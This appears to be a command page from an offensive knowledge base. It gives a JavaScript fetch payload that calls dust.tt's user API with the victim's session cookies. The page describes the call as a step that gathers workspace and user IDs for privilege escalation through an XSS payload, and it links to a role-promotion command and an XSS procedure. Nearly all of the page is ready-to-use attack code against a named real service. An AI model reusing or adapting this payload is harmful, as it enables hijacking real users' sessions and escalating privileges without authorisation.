---
id: 123e4567-e89b-12d3-a456-426614174007
data: >-
  fetch('https://dust.tt/api/user', {method: 'GET', headers: {'accept': '*/*',
  'x-commit-hash': '41c0391'}, credentials: 'include'}).then(r =>
  r.json()).then(user => { console.log(user); // Extract workspaceId =
  user.workspaces[0].sId, user.id });

  output: null

  created_at: 2023-10-01T00:00:00Z

  updated_at: 2023-10-01T00:00:00Z

  platforms: [
    "Web"
  ]

  tags: [
    "javascript",
    "api"
  ]

  ---
tags:
  - javascript
  - api
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:47.211Z'
verified: false
validated: true
submitted: true
---
# fetch-user-data-javascript

## Command

```javascript
fetch('https://dust.tt/api/user', {method: 'GET', headers: {'accept': '*/*', 'x-commit-hash': '41c0391'}, credentials: 'include'}).then(r => r.json()).then(user => { console.log(user); // Extract workspaceId = user.workspaces[0].sId, user.id });
```

## Description

This JavaScript fetch command retrieves the current user's data from Dust API, including workspace details, to enable subsequent privilege escalation in the XSS payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url | https://dust.tt/api/user | Yes |
| method | GET | Yes |
| headers | Accept and x-commit-hash for API compatibility | Yes |
| credentials | 'include' to send session cookies | Yes |

## Examples

### Basic Usage

```javascript
fetch('https://dust.tt/api/user', {credentials: 'include'}).then(r => r.json()).then(console.log);
```

### Advanced Usage

Parse for specific data:

```javascript
.then(user => {
  const wsId = user.workspaces[0]?.sId;
  const userId = user.id;
  // Use in next fetch
});
```

## Expected Output

JSON object with user details: {id: '...', email: '...', workspaces: [{sId: '...', ...}]}.

## Related

- [[commands/promote-user-role-fetch]]
- [[procedures/Trigger-XSS-for-Privilege-Escalation]]
